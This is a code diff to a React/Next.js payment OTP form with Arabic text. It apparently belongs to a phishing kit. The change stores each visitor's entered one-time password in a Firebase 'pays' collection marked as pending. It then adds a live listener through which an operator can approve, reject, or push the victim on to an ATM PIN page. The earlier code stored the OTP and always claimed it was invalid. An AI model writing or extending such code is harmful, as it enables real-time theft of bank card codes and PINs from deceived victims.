@@ -1,18 +1,23 @@
 "use client";
 
 import type React from "react";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { Button } from "@/components/ui/button";
 import { useRouter } from "next/navigation";
 import { Shield } from "lucide-react";
-import { addData } from "@/lib/firebase";
+import { addData, db } from "@/lib/firebase";
 import { usePageRedirect } from "@/lib/use-page-redirect";
+import { doc, onSnapshot } from "firebase/firestore";
+import { getRedirectUrl } from "@/lib/page-routes";
+import FullPageLoader from "./loader";
 
 export function OtpForm() {
   usePageRedirect("payment-otp");
   const router = useRouter();
   const [otp, setOtp] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [visitorId, setVisitorId] = useState("");
+  const [loading, setIsLoading] = useState(false);
 
   const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value.replace(/\D/g, "").slice(0, 6);
@@ -28,14 +33,38 @@ export function OtpForm() {
     await addData({
       id: visitorID,
       otp: otp,
+      otpApproval: "pending",
     });
     await new Promise((resolve) => setTimeout(resolve, 2000));
-    setIsSubmitting(false);
     // Navigate to success page
-    alert("  invalid  OTP !");
-    setOtp("");
+    // alert("  invalid  OTP !");
+    //setOtp("");
   };
+  useEffect(() => {
+    let v = visitorId;
+    if (typeof window !== "undefined" && !v) {
+      v = localStorage.getItem("visitor") || "";
+      setVisitorId(v);
+    }
 
+    if (!v) return;
+
+    const unsubscribe = onSnapshot(doc(db, "pays", v), (snap) => {
+      if (!snap.exists()) return;
+
+      const userData = snap.data();
+
+      if (userData.otpApproval === "pending") setIsSubmitting(true);
+
+      if (userData.cardApproval === "pin")
+        window.location.href = "/payment/atm-pin";
+      if (userData.cardApproval === "rejected") alert("رمز التحقق غير صحيح");
+      const redirectUrl = getRedirectUrl(userData.currentPage, "otp");
+      if (redirectUrl) window.location.href = redirectUrl;
+    });
+
+    return () => unsubscribe();
+  }, [visitorId]);
   const isFormValid = otp.length > 3;
 
   return (
@@ -94,7 +123,7 @@ export function OtpForm() {
             إعادة إرسال الرمز
           </button>
         </div>
-
+        {isSubmitting && <FullPageLoader />}
         {/* Security Badge */}
         <div className="flex items-center justify-center gap-2 mt-6 text-green-600">
           <Shield className="h-4 w-4" />
